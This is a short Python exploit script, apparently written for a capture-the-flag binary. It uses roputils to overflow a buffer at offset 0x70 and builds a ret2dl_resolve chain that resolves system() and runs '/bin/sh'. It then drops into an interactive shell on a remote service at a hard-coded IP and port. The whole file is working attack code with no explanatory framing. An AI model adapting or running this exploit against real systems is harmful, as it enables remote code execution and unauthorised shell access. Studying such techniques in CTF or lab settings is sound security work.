from roputils import *

#fpath = sys.argv[1]
#offset = int(sys.argv[2])

fpath = './c14595742a95ebf0944804d8853b834c'
offset = 0x70
rop = ROP(fpath)
addr_bss = rop.section('.bss')

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

#p = Proc(rop.fpath)
#p = Proc(host='127.0.0.1',port=2333)
p = Proc(host='133.130.111.139',port=2333)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

p.write(buf)
p.interact(0)
